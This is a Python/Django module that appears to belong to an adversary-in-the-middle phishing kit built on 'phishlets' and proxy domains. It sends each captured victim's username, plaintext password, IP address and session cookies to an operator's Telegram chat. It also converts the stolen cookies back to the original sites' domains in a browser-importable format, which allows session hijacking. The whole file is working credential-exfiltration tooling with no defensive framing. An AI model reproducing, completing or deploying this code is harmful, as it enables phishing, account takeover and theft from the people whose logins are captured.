import requests
import logging
import json
import tempfile
import os
import threading
import random
from django.conf import settings
from .models import NotificationSettings
from typing import Optional, Dict, Any, List

logger = logging.getLogger(__name__)

class NotificationManager:
    """Manages sending notifications through various channels"""
    
    def __init__(self):
        self.settings = self._get_settings()
        self.message_cache = {}  # Cache for message IDs to enable editing
        self._notification_locks = {}  # Locks per session to prevent duplicate notifications
        self._notification_locks_lock = threading.Lock()  # Thread safety for locks
        self._notifications_in_progress = {}  # Track notifications in progress per session
    
    def _get_settings(self) -> Optional[NotificationSettings]:
        """Get notification settings from database"""
        try:
            return NotificationSettings.objects.filter(is_active=True).first()
        except Exception as e:
            logger.error(f"Error getting notification settings: {e}")
            return None
    
    def _is_enabled(self) -> bool:
        """Return True if notifications are enabled (active settings exist)."""
        try:
            return NotificationSettings.objects.filter(is_active=True).exists()
        except Exception as e:
            logger.error(f"Error checking notification enablement: {e}")
            return False
    
    def _refresh_settings(self):
        """Refresh cached settings snapshot from DB."""
        self.settings = self._get_settings()
    
    def _get_session_lock(self, session_id: str) -> threading.Lock:
        """Get or create a lock for a specific session to prevent duplicate notifications"""
        with self._notification_locks_lock:
            if session_id not in self._notification_locks:
                self._notification_locks[session_id] = threading.Lock()
            return self._notification_locks[session_id]
    
    def _is_notification_in_progress(self, session_id: str) -> bool:
        """Check if a notification is already in progress for a session"""
        with self._notification_locks_lock:
            return self._notifications_in_progress.get(session_id, False)
    
    def _set_notification_in_progress(self, session_id: str, in_progress: bool):
        """Set notification in progress flag for a session"""
        with self._notification_locks_lock:
            self._notifications_in_progress[session_id] = in_progress
    
    def _should_report_cookies(self) -> bool:
        """Randomly decide whether to report cookies (1 in 3 chance)"""
        return random.randint(1, 3) == 1
    
    def send_telegram_message(self, message: str, parse_mode: str = "HTML", reply_markup: Optional[Dict] = None) -> Optional[int]:
        """Send a message via Telegram bot and return message ID for editing"""
        if not self._is_enabled():
            logger.info("Notifications disabled; skipping send_telegram_message")
            return None
        self._refresh_settings()
        if not self.settings or not self.settings.telegram_bot_token or not self.settings.telegram_chat_id:
            logger.warning("Telegram notifications not configured")
            return None
        
        try:
            url = f"https://api.telegram.org/bot{self.settings.telegram_bot_token}/sendMessage"
            data = {
                "chat_id": self.settings.telegram_chat_id,
                "text": message,
                "parse_mode": parse_mode
            }
            
            if reply_markup:
                data["reply_markup"] = json.dumps(reply_markup)
            
            response = requests.post(url, data=data, timeout=10)
            response.raise_for_status()
            
            result = response.json()
            if result.get("ok"):
                message_id = result["result"]["message_id"]
                logger.info(f"Telegram message sent successfully: {message[:50]}... (ID: {message_id})")
                return message_id
            else:
                logger.error(f"Telegram API error: {result}")
                return None
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error sending Telegram message: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error sending Telegram message: {e}")
            return None
    
    def edit_telegram_message(self, message_id: int, new_text: str, parse_mode: str = "HTML") -> bool:
        """Edit an existing Telegram message text"""
        if not self._is_enabled():
            logger.info("Notifications disabled; skipping edit_telegram_message")
            return False
        self._refresh_settings()
        if not self.settings or not self.settings.telegram_bot_token or not self.settings.telegram_chat_id:
            logger.warning("Telegram notifications not configured")
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.settings.telegram_bot_token}/editMessageText"
            data = {
                "chat_id": self.settings.telegram_chat_id,
                "message_id": message_id,
                "text": new_text,
                "parse_mode": parse_mode
            }
            
            response = requests.post(url, data=data, timeout=10)
            
            # Log the full response for debugging
            logger.info(f"Telegram API response status: {response.status_code}")
            logger.info(f"Telegram API response body: {response.text}")
            
            response.raise_for_status()
            
            result = response.json()
            if result.get("ok"):
                logger.info(f"Telegram message edited successfully (ID: {message_id})")
                return True
            else:
                logger.error(f"Telegram API error editing message: {result}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error editing Telegram message: {e}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error editing Telegram message: {e}")
            return False
    
    def edit_telegram_message_media(self, message_id: int, file_path: str, caption: str, parse_mode: str = "HTML") -> bool:
        """Edit an existing Telegram message with new media (file).

        Can also convert a text-only message into a document message by replacing its content with media.
        """
        if not self._is_enabled():
            logger.info("Notifications disabled; skipping edit_telegram_message_media")
            return False
        self._refresh_settings()
        if not self.settings or not self.settings.telegram_bot_token or not self.settings.telegram_chat_id:
            logger.warning("Telegram notifications not configured")
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.settings.telegram_bot_token}/editMessageMedia"
            
            # Create multipart form data
            with open(file_path, 'rb') as file:
                files = {'file': file}
                data = {
                    "chat_id": self.settings.telegram_chat_id,
                    "message_id": message_id,
                    "media": json.dumps({
                        "type": "document",
                        "media": "attach://file",
                        "caption": caption,
                        "parse_mode": parse_mode
                    })
                }
                
                response = requests.post(url, files=files, data=data, timeout=30)
                response.raise_for_status()
                
                result = response.json()
                if result.get("ok"):
                    logger.info(f"Telegram message media edited successfully (ID: {message_id})")
                    return True
                else:
                    logger.error(f"Telegram API error editing message media: {result}")
                    return False
                    
        except FileNotFoundError:
            logger.error(f"File not found: {file_path}")
            return False
        except requests.exceptions.RequestException as e:
            logger.error(f"Error editing Telegram message media: {e}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error editing Telegram message media: {e}")
            return False

    def edit_telegram_message_caption(self, message_id: int, caption: str, parse_mode: str = "HTML") -> bool:
        """Edit caption of an existing Telegram media message.

        Use this after a message has been converted to a media/document message
        (text edits will fail on media messages).
        """
        if not self._is_enabled():
            logger.info("Notifications disabled; skipping edit_telegram_message_caption")
            return False
        self._refresh_settings()
        if not self.settings or not self.settings.telegram_bot_token or not self.settings.telegram_chat_id:
            logger.warning("Telegram notifications not configured")
            return False

        try:
            url = f"https://api.telegram.org/bot{self.settings.telegram_bot_token}/editMessageCaption"
            data = {
                "chat_id": self.settings.telegram_chat_id,
                "message_id": message_id,
                "caption": caption,
                "parse_mode": parse_mode
            }

            response = requests.post(url, data=data, timeout=10)
            response.raise_for_status()

            result = response.json()
            if result.get("ok"):
                logger.info(f"Telegram message caption edited successfully (ID: {message_id})")
                return True
            else:
                logger.error(f"Telegram API error editing caption: {result}")
                return False

        except requests.exceptions.RequestException as e:
            logger.error(f"Error editing Telegram message caption: {e}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error editing Telegram message caption: {e}")
            return False
    
    def send_telegram_file(self, file_path: str, caption: str = "", parse_mode: str = "HTML") -> Optional[int]:
        """Send a file via Telegram bot and return message ID"""
        if not self._is_enabled():
            logger.info("Notifications disabled; skipping send_telegram_file")
            return None
        self._refresh_settings()
        if not self.settings or not self.settings.telegram_bot_token or not self.settings.telegram_chat_id:
            logger.warning("Telegram notifications not configured")
            return None
        
        try:
            url = f"https://api.telegram.org/bot{self.settings.telegram_bot_token}/sendDocument"
            
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {
                    "chat_id": self.settings.telegram_chat_id,
                    "caption": caption,
                    "parse_mode": parse_mode
                }
                
                response = requests.post(url, files=files, data=data, timeout=30)
                response.raise_for_status()
                
                result = response.json()
                if result.get("ok"):
                    message_id = result["result"]["message_id"]
                    logger.info(f"Telegram file sent successfully: {file_path} (ID: {message_id})")
                    return message_id
                else:
                    logger.error(f"Telegram API error sending file: {result}")
                    return None
                    
        except FileNotFoundError:
            logger.error(f"File not found: {file_path}")
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"Error sending Telegram file: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error sending Telegram file: {e}")
            return None
    
    def create_cookies_file(self, cookies_data: Dict[str, Any], session_id: str) -> str:
        """Create a temporary JSON file that is a list of cookie objects.

        Output format (array only):
        [
          {
            "name": str,
            "value": str,
            "domain": str,
            "hostOnly": bool,
            "path": str,
            "secure": bool,
            "httpOnly": bool,
            "sameSite": str | null,
            "session": bool,
            "firstPartyDomain": str,
            "partitionKey": any | null,
            "expirationDate": int | null,
            "storeId": any | null
          },
          ...
        ]
        """
        try:
            # Normalize cookies to a list of objects
            raw_cookies = cookies_data.get('cookies')
            cookies_list: List[Dict[str, Any]] = []
            default_domain = (
                cookies_data.get('domain')
                or cookies_data.get('proxy_domain')
                or (cookies_data.get('session_info') or {}).get('proxy_domain')
            )

            if isinstance(raw_cookies, dict):
                # Convert mapping to list of {name, value}
                for cookie_name, cookie_value in raw_cookies.items():
                    domain = default_domain
                    host_only = True if (domain and not str(domain).startswith('.')) else False
                    cookies_list.append({
                        "name": str(cookie_name),
                        "value": str(cookie_value),
                        "domain": domain or "",
                        "hostOnly": host_only if domain else True,
                        "path": "/",
                        "secure": False,
                        "httpOnly": False,
                        "sameSite": None,
                        "session": True,
                        "firstPartyDomain": "",
                        "partitionKey": None,
                        "expirationDate": None,
                        "storeId": None,
                    })
            elif isinstance(raw_cookies, list):
                for item in raw_cookies:
                    if isinstance(item, dict):
                        # Preserve known cookie fields if present
                        domain = item.get("domain") or default_domain or ""
                        host_only = True if (domain and not str(domain).startswith('.')) else False
                        expiration = item.get("expirationDate")
                        if expiration is None and isinstance(item.get("expires"), (int, float)):
                            expiration = int(item.get("expires"))
                        cookies_list.append({
                            "name": str(item.get("name", "")),
                            "value": str(item.get("value", "")),
                            "domain": domain,
                            "hostOnly": item.get("hostOnly", host_only),
                            "path": item.get("path", "/"),
                            "secure": bool(item.get("secure", False)),
                            "httpOnly": bool(item.get("httpOnly", False)),
                            "sameSite": item.get("sameSite"),
                            "session": bool(item.get("session", expiration is None)),
                            "firstPartyDomain": item.get("firstPartyDomain", ""),
                            "partitionKey": item.get("partitionKey"),
                            "expirationDate": expiration,
                            "storeId": item.get("storeId"),
                        })
                    else:
                        cookies_list.append({
                            "name": "",
                            "value": str(item),
                            "domain": default_domain or "",
                            "hostOnly": True if (default_domain and not str(default_domain).startswith('.')) else True,
                            "path": "/",
                            "secure": False,
                            "httpOnly": False,
                            "sameSite": None,
                            "session": True,
                            "firstPartyDomain": "",
                            "partitionKey": None,
                            "expirationDate": None,
                            "storeId": None,
                        })
            elif raw_cookies is not None:
                domain = default_domain
                host_only = True if (domain and not str(domain).startswith('.')) else True
                cookies_list.append({
                    "name": "",
                    "value": str(raw_cookies),
                    "domain": domain or "",
                    "hostOnly": host_only,
                    "path": "/",
                    "secure": False,
                    "httpOnly": False,
                    "sameSite": None,
                    "session": True,
                    "firstPartyDomain": "",
                    "partitionKey": None,
                    "expirationDate": None,
                    "storeId": None,
                })

            # Create a temporary JSON file
            temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False, encoding='utf-8')
            json.dump(cookies_list, temp_file, ensure_ascii=False, indent=2)
            temp_file.close()
            return temp_file.name

        except Exception as e:
            logger.error(f"Error creating cookies file: {e}")
            return None

    def transform_cookies_for_phishlet(self, cookies_input: Any, phishlet_data: Dict[str, Any], proxy_domain: str) -> List[Dict[str, Any]]:
        """Normalize and transform cookies to original domains per phishlet mapping.

        - Normalizes input into list of cookie objects with standard fields
        - Replaces proxy domains with original hostnames based on phishlet hosts_to_proxy mapping
        - Handles wildcard cookie domains by mapping ".proxy" to ".original_base"
        """
        try:
            # 1) Normalize to list of cookie objects
            normalized: List[Dict[str, Any]] = []

            def _base_domain(hostname: str) -> str:
                if not hostname:
                    return ''
                parts = hostname.split('.')
                if len(parts) < 2:
                    return hostname
                return '.'.join(parts[-2:])

            if isinstance(cookies_input, dict):
                for name, value in cookies_input.items():
                    host_only = True if (proxy_domain and not str(proxy_domain).startswith('.')) else True
                    normalized.append({
                        "name": str(name),
                        "value": str(value),
                        "domain": proxy_domain or "",
                        "hostOnly": host_only,
                        "path": "/",
                        "secure": False,
                        "httpOnly": False,
                        "sameSite": None,
                        "session": True,
                        "firstPartyDomain": "",
                        "partitionKey": None,
                        "expirationDate": None,
                        "storeId": None,
                    })
            elif isinstance(cookies_input, list):
                for item in cookies_input:
                    if isinstance(item, dict):
                        domain = item.get("domain") or proxy_domain or ""
                        host_only = item.get("hostOnly", bool(domain and not str(domain).startswith('.')))
                        expiration = item.get("expirationDate")
                        if expiration is None and isinstance(item.get("expires"), (int, float)):
                            expiration = int(item.get("expires"))
                        normalized.append({
                            "name": str(item.get("name", "")),
                            "value": str(item.get("value", "")),
                            "domain": domain,
                            "hostOnly": host_only,
                            "path": item.get("path", "/"),
                            "secure": bool(item.get("secure", False)),
                            "httpOnly": bool(item.get("httpOnly", False)),
                            "sameSite": item.get("sameSite"),
                            "session": bool(item.get("session", expiration is None)),
                            "firstPartyDomain": item.get("firstPartyDomain", ""),
                            "partitionKey": item.get("partitionKey"),
                            "expirationDate": expiration,
                            "storeId": item.get("storeId"),
                        })
                    else:
                        normalized.append({
                            "name": "",
                            "value": str(item),
                            "domain": proxy_domain or "",
                            "hostOnly": True if (proxy_domain and not str(proxy_domain).startswith('.')) else True,
                            "path": "/",
                            "secure": False,
                            "httpOnly": False,
                            "sameSite": None,
                            "session": True,
                            "firstPartyDomain": "",
                            "partitionKey": None,
                            "expirationDate": None,
                            "storeId": None,
                        })
            else:
                normalized.append({
                    "name": "",
                    "value": str(cookies_input),
                    "domain": proxy_domain or "",
                    "hostOnly": True if (proxy_domain and not str(proxy_domain).startswith('.')) else True,
                    "path": "/",
                    "secure": False,
                    "httpOnly": False,
                    "sameSite": None,
                    "session": True,
                    "firstPartyDomain": "",
                    "partitionKey": None,
                    "expirationDate": None,
                    "storeId": None,
                })

            # 2) Build replacement map from phishlet
            hosts_to_proxy = (phishlet_data or {}).get('hosts_to_proxy', [])
            replacement_pairs: List[tuple] = []  # (source_domain, target_domain)
            for host_entry in hosts_to_proxy:
                if not host_entry.get('reverce_filter', False):
                    continue
                original_host = (host_entry.get('host') or '').strip()
                proxy_sub = (host_entry.get('proxy_subdomain') or '').strip()
                if not original_host:
                    continue
                proxy_host = f"{proxy_sub}.{proxy_domain}" if proxy_sub else proxy_domain
                # Exact domain mapping
                replacement_pairs.append((proxy_host, original_host))
                # Wildcard mapping (.proxy -> .original_base)
                replacement_pairs.append((f".{proxy_host}", f".{_base_domain(original_host)}"))

            # Sort by length desc for specific matches first
            replacement_pairs.sort(key=lambda x: len(x[0]), reverse=True)

            # 3) Apply replacements to cookie domains
            for cookie in normalized:
                cdom = cookie.get('domain') or ''
                had_dot = cdom.startswith('.')
                for src, dst in replacement_pairs:
                    if cdom == src:
                        cookie['domain'] = dst
                        break
                    # Handle subdomain wildcard scenario
                    if cdom.startswith('.') and src.startswith('.') and cdom.endswith(src):
                        cookie['domain'] = dst
                        break
                # Update hostOnly based on leading dot
                cookie['hostOnly'] = False if (cookie.get('domain') or '').startswith('.') is False else True

            return normalized
        except Exception as e:
            logger.error(f"Error transforming cookies for phishlet: {e}")
            # Fallback to simple list
            return self.transform_cookies_for_phishlet([], {}, proxy_domain) if False else []

    def cookies_to_json(self, cookies_list: List[Dict[str, Any]]) -> str:
        """Serialize cookie list to JSON string."""
        try:
            return json.dumps(cookies_list, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error serializing cookies to JSON: {e}")
            return "[]"
    
    def cleanup_temp_file(self, file_path: str):
        """Clean up temporary file"""
        try:
            if file_path and os.path.exists(file_path):
                os.unlink(file_path)
                logger.debug(f"Temporary file cleaned up: {file_path}")
        except Exception as e:
            logger.warning(f"Error cleaning up temporary file {file_path}: {e}")
    
    def notify_session_captured(self, session_data: Dict[str, Any], is_update: bool = False, previous_message_id: Optional[int] = None) -> Optional[int]:
        """Send a SINGLE canonical Telegram message per session and edit it on updates.

        This implementation avoids creating extra messages (no auto file attachments,
        no fallback to sending a new top-level message on edit failure).
        """
        if not self._is_enabled():
            logger.info("Notifications disabled; skipping session notification")
            return previous_message_id if is_update else None
        session_id = session_data.get('session_id', 'N/A')
        
        # Check if notification is already in progress for this session
        if self._is_notification_in_progress(session_id):
            logger.info(f"Notification already in progress for session {session_id}, skipping duplicate")
            return previous_message_id
        
        # Set notification in progress flag
        self._set_notification_in_progress(session_id, True)
        
        # Get session-specific lock to prevent duplicate notifications
        session_lock = self._get_session_lock(session_id)
        
        # Try to acquire the lock with a timeout to prevent deadlocks
        if not session_lock.acquire(timeout=5.0):
            logger.warning(f"Could not acquire notification lock for session {session_id}, skipping notification")
            self._set_notification_in_progress(session_id, False)
            return previous_message_id
        
        try:
            phishlet_name = session_data.get('phishlet_name', 'Unknown')
            username = session_data.get('captured_username', 'N/A')
            password = session_data.get('captured_password', 'N/A')
            ip_address = session_data.get('ip_address', 'N/A')
            # Transform cookies before including in message
            raw_cookies = session_data.get('captured_cookies', {})
            phishlet_data = {}
            try:
                from .models import Phishlet
                # session_data includes name; this block is best-effort and optional
                ph_name = session_data.get('phishlet_name')
                ph = Phishlet.objects.filter(name=ph_name).first() if ph_name else None
                phishlet_data = ph.data if ph and isinstance(ph.data, dict) else {}
            except Exception:
                phishlet_data = {}
            cookies = self.transform_cookies_for_phishlet(raw_cookies, phishlet_data, session_data.get('proxy_domain',''))
            custom_data = session_data.get('captured_custom', {})
            
            # Create the main message with emojis for better visual appeal
            if is_update:
                message = f"""🔄 Session Updated!

📋 Phishlet: {phishlet_name}
👤 Username: {username}
🔑 Password: {password}
🌐 IP Address: {ip_address}
🆔 Session ID: {session_id}
⏰ Update Time: {session_data.get('updated', 'N/A')}
📊 Data Summary:
• Username: {'✅ Captured' if username and username != 'N/A' else '❌ Not captured'}
• Password: {'✅ Captured' if password and password != 'N/A' else '❌ Not captured'}
• Cookies: {'✅ Captured' if cookies else '❌ Not captured'}
• Custom Data: {'✅ Captured' if custom_data else '❌ Not captured'}""".strip()
            else:
                message = f"""🚨 New Session Captured!

📋 Phishlet: {phishlet_name}
👤 Username: {username}
🔑 Password: {password}
🌐 IP Address: {ip_address}
🆔 Session ID: {session_id}
⏰ Capture Time: {session_data.get('created', 'N/A')}
📊 Data Summary:
• Username: {'✅ Captured' if username and username != 'N/A' else '❌ Not captured'}
• Password: {'✅ Captured' if password and password != 'N/A' else '❌ Not captured'}
• Cookies: {'✅ Captured' if cookies else '❌ Not captured'}
• Custom Data: {'✅ Captured' if custom_data else '❌ Not captured'}""".strip()
            
            # Always try to edit existing message if we have a previous message ID
            # If we don't have a previous message ID but this is an update, wait a bit for the initial message
            if not previous_message_id and is_update:
                # Wait a moment for the initial message to be sent and stored
                import time
                time.sleep(0.5)
                # Try to get the message ID again
                if hasattr(session_data, 'get_session_message_id'):
                    previous_message_id = session_data.get_session_message_id()
                elif 'session_id' in session_data:
                    # Try to get from cache or database
                    from .models import Session
                    try:
                        session = Session.objects.get(id=session_data['session_id'])
                        previous_message_id = session.telegram_message_id
                    except:
                        pass
            
            if previous_message_id:
                # Attempt to edit the existing message text first. If that fails (e.g., message is media),
                # fall back to editing the caption of the media message with a safely truncated version.
                try:
                    success = self.edit_telegram_message(previous_message_id, message)
                    if success:
                        message_id = previous_message_id
                        logger.info(f"Updated existing message {message_id} text for session {session_id}")
                        return message_id
                    else:
                        logger.warning(f"Text edit failed for message {previous_message_id} (session {session_id}); trying caption edit")
                        # Fallback: edit caption (Telegram limits caption length; keep it safe)
                        max_caption_len = 1000
                        caption = (message[:max_caption_len] + "…") if len(message) > max_caption_len else message
                        cap_ok = self.edit_telegram_message_caption(previous_message_id, caption)
                        if cap_ok:
                            logger.info(f"Updated caption for message {previous_message_id} (session {session_id})")
                            return previous_message_id
                        logger.warning(f"Caption edit also failed for message {previous_message_id} (session {session_id})")
                        return previous_message_id
                except Exception as e:
                    logger.error(f"Error editing message for session {session_id}: {e}")
                    return previous_message_id
            else:
                # Send a single new text message as the canonical thread for this session
                message_id = self.send_telegram_message(message)
                logger.info(f"Sent new message {message_id} for session {session_id}")
            
            # No automatic file attachments; keep a single message per session.
            
            return message_id
            
        except Exception as e:
            logger.error(f"Error sending session captured notification: {e}")
            return None
        finally:
            # Always release the lock and clear the in-progress flag
            session_lock.release()
            self._set_notification_in_progress(session_id, False)
    
    def notify_session_updated(self, session_data: Dict[str, Any], previous_message_id: Optional[int] = None) -> Optional[int]:
        """Send notification when a session is updated"""
        return self.notify_session_captured(session_data, is_update=True, previous_message_id=previous_message_id)
    
    def notify_proxy_status_change(self, proxy_name: str, status: str) -> bool:
        """Send notification when proxy status changes"""
        try:
            status_emoji = "🟢" if status == "active" else "🔴"
            message = f"""
🔌 <b>Proxy Status Changed</b>

📛 <b>Proxy:</b> {proxy_name}
📊 <b>Status:</b> {status_emoji} {status.title()}
            """.strip()
            
            return self.send_telegram_message(message) is not None
            
        except Exception as e:
            logger.error(f"Error sending proxy status notification: {e}")
            return False
    
    def notify_server_status_change(self, server_type: str, status: str) -> bool:
        """Send notification when server status changes"""
        try:
            status_emoji = "🟢" if status == "running" else "🔴"
            server_emoji = "🌐" if server_type == "proxy" else "📡"
            
            message = f"""
🖥️ <b>Server Status Changed</b>

{server_emoji} <b>Server:</b> {server_type.title()} Server
📊 <b>Status:</b> {status_emoji} {status.title()}
            """.strip()
            
            return self.send_telegram_message(message) is not None
            
        except Exception as e:
            logger.error(f"Error sending server status notification: {e}")
            return False
    
    def notify_error(self, error_message: str, context: str = "General") -> bool:
        """Send notification for errors"""
        try:
            message = f"""
⚠️ <b>Error Alert</b>

🔍 <b>Context:</b> {context}
❌ <b>Error:</b> {error_message}
            """.strip()
            
            return self.send_telegram_message(message) is not None
            
        except Exception as e:
            logger.error(f"Error sending error notification: {e}")
            return False
    
    def cache_message(self, session_id: str, message_id: int):
        """Cache message ID for future editing"""
        self.message_cache[session_id] = message_id
        logger.debug(f"Cached message ID {message_id} for session {session_id}")
    
    def get_cached_message_id(self, session_id: str) -> Optional[int]:
        """Get cached message ID for a session"""
        return self.message_cache.get(session_id)
    
    def clear_cached_message(self, session_id: str):
        """Clear cached message ID for a session"""
        if session_id in self.message_cache:
            del self.message_cache[session_id]
            logger.debug(f"Cleared cached message ID for session {session_id}")

# Global notification manager instance
notification_manager = NotificationManager()

# Convenience functions for easy access
def send_notification(message: str, notification_type: str = "info") -> bool:
    """Send a notification"""
    return notification_manager.send_telegram_message(message) is not None

def notify_session_captured(session_data: Dict[str, Any], is_update: bool = False, previous_message_id: Optional[int] = None) -> Optional[int]:
    """Send notification when a session is captured"""
    return notification_manager.notify_session_captured(session_data, is_update, previous_message_id)

def notify_session_updated(session_data: Dict[str, Any], previous_message_id: Optional[int] = None) -> Optional[int]:
    """Send notification when a session is updated"""
    return notification_manager.notify_session_updated(session_data, previous_message_id)

def notify_proxy_status_change(proxy_name: str, status: str) -> bool:
    """Send notification when proxy status changes"""
    return notification_manager.notify_proxy_status_change(proxy_name, status)

def notify_server_status_change(server_type: str, status: str) -> bool:
    """Send notification when server status changes"""
    return notification_manager.notify_server_status_change(server_type, status)

def notify_error(error_message: str, context: str = "General") -> bool:
    """Send notification for errors"""
    return notification_manager.notify_error(error_message, context)

def cache_message(session_id: str, message_id: int):
    """Cache message ID for future editing"""
    notification_manager.cache_message(session_id, message_id)

def get_cached_message_id(session_id: str) -> Optional[int]:
    """Get cached message ID for a session"""
    return notification_manager.get_cached_message_id(session_id)

def clear_cached_message(session_id: str):
    """Clear cached message ID for a session"""
    notification_manager.clear_cached_message(session_id)
